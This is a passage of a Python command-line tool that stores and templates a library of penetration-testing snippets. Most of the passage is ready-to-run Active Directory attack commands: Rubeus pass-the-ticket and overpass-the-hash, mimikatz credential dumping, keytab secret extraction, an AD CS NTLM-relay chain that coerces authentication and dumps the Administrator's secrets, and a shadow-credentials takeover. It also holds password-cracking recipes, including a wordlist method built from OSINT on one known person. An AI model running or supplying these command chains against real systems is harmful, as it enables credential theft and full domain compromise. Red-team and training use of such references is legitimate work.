Rubeus.exe asktgt /user:{{user}} /rc4:{{ntlm}} /domain:{{domain}} /ptt

# pass an existing ticket
Rubeus.exe ptt /ticket:{{ticket_file}}.kirbi
Rubeus.exe ptt /ticket:{{base64_ticket}}

# protect session TGTs with a sacrificial logon, then pass into it
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:{{user}} /domain:{{domain}} /aes256:{{aes256_key}} /ptt
'''

[cred-ptk-overpass-hash]
description = "Pass the Key / OverPass-the-Hash — convert an NTLM/AES key into a full TGT"
lang = "text"
tags = ["creds", "ptk", "kerberos", "overpass-the-hash"]
body = '''
# reuses a password hash to get a full TGT without touching Kerberos pre-auth checks
privilege::debug
sekurlsa::ekeys

Rubeus.exe asktgt /domain:{{domain}} /user:{{user}} /aes256:{{aes256_key}} /nowrap
Rubeus.exe asktgt /domain:{{domain}} /user:{{user}} /rc4:{{ntlm}} /ptt
sekurlsa::pth /domain:{{domain}} /user:{{user}} /ntlm:{{ntlm}}
# Rubeus needs local administrator for PtK
'''

[cred-ptt-linux]
description = "Pass-the-Ticket from Linux: ccache/keytab handling and impersonation"
lang = "bash"
tags = ["creds", "ptt", "kerberos", "linux"]
body = '''
# ccache lives in /tmp, pointed to by KRB5CCNAME (root-readable even with special perms)
export KRB5CCNAME=/tmp/{{user}}.ccache
smbclient //{{dc}}/{{share}} -k -c ls
proxychains impacket-wmiexec {{dc}} -k

# keytabs: pairs of principal + encrypted key, not host-specific
find / -name *keytab* -ls 2>/dev/null
klist -k -t {{keytab_file}}
kinit {{principal}} -k -t {{keytab_file}}
klist

# secret extraction from a keytab (NTLM for PtH, AES for ticket forging/cracking)
python3 /opt/keytabextract.py {{keytab_file}}

# ccache <-> kirbi conversion
impacket-ticketConverter {{ccache_file}} {{out}}.kirbi
# C:\tools\Rubeus.exe ptt /ticket:c:\tools\{{out}}.kirbi

# Linikatz: Linux-side credential dumper for Kerberos material
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
'''

[cred-ptc-adcs-esc8]
description = "Pass-the-Certificate via AD CS NTLM relay (ESC8)"
lang = "bash"
tags = ["creds", "ptc", "adcs", "esc8", "ntlm-relay"]
body = '''
# web enrolment is typically at CertSrv
impacket-ntlmrelayx -t http://{{cert_srv_ip}}/certsrv/certfnsh.asp -adcs -smb2support --template KerberosAuthentication

sudo certipy-ad find -u {{user}} -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable
sudo certipy-ad relay -interface "{{my_ip}}" -ca '{{ca_name}}' -template KerberosAuthentication -target http://{{cert_adcs_ip}}

# coerce authentication to trigger the relay
sudo python3 -m pip install coercer
coercer coerce -t {{dc_ip}} -d {{domain}} -u {{user}} -p '{{password}}' -l "{{my_ip}}" -vv
# or printerbug / phishing
python3 printerbug.py {{domain}}/{{user}}:'{{password}}'@{{target}} {{lhost}}

# use the resulting PFX to get a TGT (needs PKINITtools, may need oscrypto)
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate && pip3 install -r requirements.txt
python3 gettgtpkinit.py -cert-pfx {{cert}}.pfx -dc-ip {{dc_ip}} '{{domain}}/{{user}}' /tmp/{{user}}.ccache
export KRB5CCNAME=/tmp/{{user}}.ccache
impacket-secretsdump -k -no-pass -dc-ip {{dc_ip}} -just-dc-user Administrator '{{domain}}/{{computer}}$'@{{dc_fqdn}}
'''

[cred-shadow-credentials]
description = "Shadow Credentials attack via msDS-KeyCredentialLink (pywhisker)"
lang = "bash"
tags = ["creds", "shadow-credentials", "pywhisker", "adcs"]
body = '''
# needs write access to the target's msDS-KeyCredentialLink (BloodHound AddKeyCredentialLink edge)
pywhisker --dc-ip {{dc_ip}} -d {{domain}} -u {{user}} -p '{{password}}' --target {{victim}} --action add
# outputs a PFX + password; use it to request a TGT:
python3 gettgtpkinit.py -cert-pfx {{out}}.pfx -pfx-pass '{{pfx_password}}' -dc-ip {{dc_ip}} {{domain}}/{{victim}} /tmp/{{victim}}.ccache
export KRB5CCNAME=/tmp/{{victim}}.ccache
klist
evil-winrm -i {{dc_fqdn}} -r {{domain}}
# NOTE: if pre-auth fails due to missing EKU support, look at PassTheCert (LDAPS auth via cert)
'''

# ══ PASSWORD CRACKING & PROTECTED FILES ══════════════════════════════
[crack-identify-hash]
description = "identify a hash format and quick Python hashing"
lang = "bash"
tags = ["cracking", "hashid"]
body = '''
hashid -j {{some_hash}}
hashid -m '{{some_hash}}'
python3 -c "import hashlib; print(hashlib.sha1(b'{{string}}').hexdigest())"
'''

[crack-2john-extract]
description = "extract crackable hashes from protected files with *2john tools"
lang = "bash"
tags = ["cracking", "john", "2john"]
body = '''
locate *2john*
pdf2john {{file}}.pdf > file.hash
ssh2john {{id_rsa}} > ssh.hash
keepass2john {{db}}.kdbx > keepass.hash
# generic pattern: <filetype>2john <file_to_crack> > file.hash
'''

[crack-john-modes]
description = "John the Ripper common modes"
lang = "bash"
tags = ["cracking", "john"]
body = '''
john --single {{passwd_file}}
john --incremental {{passwd_file}}          # uses the modes defined in john.conf
john --wordlist={{wordlist}} {{hash_file}}
john --format=ripemd-128 {{hash_file}}
john --show --format={{format}} {{hash_file}}   # John Show also needs --format
'''

[crack-hashcat-basics]
description = "hashcat dictionary/mask attack basics + rules"
lang = "bash"
tags = ["cracking", "hashcat"]
body = '''
hashcat -a 0 -m {{mode}} {{hashes}} {{wordlist}}        # -a 0 dictionary attack
hashcat -a 3 -m {{mode}} {{hashes}} '?u?l?l?l?l?d?s'     # -a 3 mask attack
hashcat -a 0 -m {{mode}} {{hashes}} {{wordlist}} -r /usr/share/hashcat/rules/best64.rule
ls -l /usr/share/hashcat/rules
'''

[crack-hashcat-masks-ref]
description = "hashcat mask-attack charset reference"
lang = "text"
tags = ["cracking", "hashcat", "masks"]
body = '''
?l  abcdefghijklmnopqrstuvwxyz
?u  ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d  0123456789
?h  0123456789abcdef
?H  0123456789ABCDEF
?s  space!"#$%&'()*+,-./:;<=>?@[]^_`{|}~
?a  ?l?u?d?s
?b  0x00 - 0xff
'''

[crack-hashcat-rules-ref]
description = "hashcat custom rule function reference + mutate-a-wordlist example"
lang = "text"
tags = ["cracking", "hashcat", "rules"]
body = '''
:     do nothing
l     lowercase all letters
u     uppercase all letters
c     capitalize the first letter, lowercase the rest
sXY   replace all instances of X with Y
$!    append the ! character (any literal char works after $)

# mutate a wordlist with a custom rule file and dedupe the output
hashcat --force {{wordlist}} -r {{custom}}.rule --stdout | sort -u > mutated.list
'''

[crack-hashcat-hybrid-combinator]
description = "hashcat hybrid (-a 6/7) and combinator (-a 1) passes for short base words"
lang = "bash"
tags = ["cracking", "hashcat", "hybrid"]
body = '''
# combinator: join two wordlists word-for-word (e.g. AliceBob, AliceSmith)
hashcat -m {{mode}} -a 1 {{hashes}} {{wordlist1}} {{wordlist2}} -O -w 3

# hybrid: base word + mask tail (e.g. Baseball2024!, Alice1998!)
hashcat -m {{mode}} -a 6 {{hashes}} {{wordlist}} '?d?d?d?d?s' -O -w 3
'''

[crack-targeted-wordlist-workflow]
description = "building a small, high-signal OSINT-based wordlist + rule for a known target"
lang = "text"
tags = ["cracking", "osint", "wordlist", "methodology"]
body = '''
When targeting a single known individual, build a small base list from OSINT
rather than relying on rockyou:
1. Collect every meaningful token (names, places, employer, interests, teams)
   with a tool like cewl or username-anarchy; save as {{target}}.txt
2. Separately note number fragments from any known DOB/dates (full year, 2-digit
   year, MMDD, full DOB) — used as append targets, not base words
3. Write a rule file biasing toward the policy's required classes, e.g. the common
   human pattern "Capitalized word + number + symbol" satisfies upper/lower/digit/
   symbol requirements in one shot; save as {{target}}.rule
4. Run order: targeted rule pass first (highest yield) -> hybrid mask pass with
   the known number/symbol tails -> combinator pass joining short base words ->
   fall back to broad community rules (rockyou, dive.rule) only if nothing lands
5. Filter candidates against the real policy before hashing to save time:
     hashcat --stdout {{target}}.txt -r {{target}}.rule | \
       awk 'length($0) >= {{min_len}}' | \
       grep -P '(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[^A-Za-z0-9])' | \
       hashcat -m {{mode}} -a 0 {{hashes}} -O -w 3
'''

[crack-wordlist-policy-filters]
description = "grep-based wordlist filters to match a target password policy"
lang = "bash"
tags = ["cracking", "wordlist", "filters"]
body = '''
# minimum length (edit the {8,} to your policy's minimum)
grep -E '^.{8,}$' {{wordlist}} > filtered.txt

# require each character class present
grep -E '[A-Z]' {{wordlist}} | grep -E '[a-z]' | grep -E '[0-9]' | \
  grep -E '([!@#$%^&*].*){2,}' > filtered.txt

# combined length + all-class check in one pass
awk 'length($0) >= {{min_len}}' {{wordlist}} | \
  grep -P '(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[^A-Za-z0-9])'
'''

"""
# ────────────────────────────────────────────────────────────────────────────

DB: dict[str, dict] = tomllib.loads(SNIPPETS)
PLACEHOLDER = re.compile(r"\{\{\s*(\w+)\s*\}\}")
err = Console(stderr=True)
out = Console()

app = App(name="snip", help=__doc__, version="0.1.0")


def candidates(query: str) -> list[str]:
    """exact -> prefix -> substring -> fuzzy; the first non-empty tier wins."""
    q = query.lower()
    names = list(DB)
    if q in DB:
        return [q]
    for tier in (
        [n for n in names if n.lower().startswith(q)],
        [n for n in names if q in n.lower()],
        get_close_matches(q, names, n=8, cutoff=0.5),
    ):
        if tier:
            return tier
    return []


def pick(names: list[str]) -> str:
    if shutil.which("fzf") and sys.stdin.isatty():
        with tempfile.TemporaryDirectory() as tmp:
            # index-based filenames, so odd characters in snippet names are safe
            for i, n in enumerate(names):
                (Path(tmp) / str(i)).write_text(DB[n]["body"])
            lines = "\n".join(
                f"{i}\t{n}\t{DB[n].get('description', '')}" for i, n in enumerate(names)
            )
            r = subprocess.run(
                [
                    "fzf",
                    "--delimiter=\t",
                    "--with-nth=2,3",
                    "--preview",
                    f"cat {shlex.quote(tmp)}/{{1}}",
                    "--preview-window=right,60%",
                ],
                input=lines,
                text=True,
                stdout=subprocess.PIPE,
            )
        if r.returncode != 0:
            raise SystemExit(1)
        return r.stdout.split("\t")[1]
    for i, n in enumerate(names, 1):
        err.print(
            f"[cyan]{i:>2}[/] [bold]{n}[/]  [dim]{DB[n].get('description', '')}[/]"
        )
    choice = IntPrompt.ask(
        "pick", console=err, choices=[str(i) for i in range(1, len(names) + 1)]
    )
    return names[choice - 1]


def render(body: str, values: dict[str, str]) -> str:
    def sub(m: re.Match) -> str:
        key = m.group(1)
        if key not in values:
            values[key] = Prompt.ask(f"[yellow]{key}[/]", console=err)
        return values[key]

    return PLACEHOLDER.sub(sub, body)


@app.default
def get(
    query: str | None = None,
    *,
    set_: Annotated[
        list[str] | None,
        Parameter(
            name=["--set", "-s"], negative_iterable="", help="fill {{key}} as key=value"
        ),
    ] = None,
    raw: Annotated[
        bool, Parameter(negative="", help="no templating, no highlighting")
    ] = False,
) -> None:
    """Print a snippet to stdout (opens a picker if the match is ambiguous).

    Parameters
    ----------
    query
        Name or partial name of the snippet. Omit to browse all.
    """
    names = candidates(query) if query else list(DB)
    if not names:
        err.print(f"[red]no snippet matching[/] {query!r}")
        raise SystemExit(1)
    name = names[0] if len(names) == 1 else pick(names)
    snip = DB[name]
    body = snip["body"]
    if not raw:
        try:
            values = dict(kv.split("=", 1) for kv in (set_ or []))
        except ValueError:
            err.print("[red]--set expects key=value[/]")
            raise SystemExit(2)
        body = render(body, values)
    if raw or not sys.stdout.isatty():
        sys.stdout.write(body)
    else:
        out.print(
            Syntax(body, snip.get("lang", "text"), theme="ansi_dark", word_wrap=True)
        )


@app.command(name="ls")
def list_snippets(
    *, tag: Annotated[str | None, Parameter(name=["--tag", "-t"])] = None
) -> None:
    """List snippets, optionally filtered by tag."""
    t = Table(box=None, header_style="bold")
    for col in ("name", "lang", "tags", "description"):
        t.add_column(col)
    for n, s in sorted(DB.items()):
        if tag and tag not in s.get("tags", []):
            continue
        t.add_row(
            n, s.get("lang", ""), ",".join(s.get("tags", [])), s.get("description", "")
        )
    out.print(t)  # stdout: Rich drops colour automatically when piped


if __name__ == "__main__":
    app()
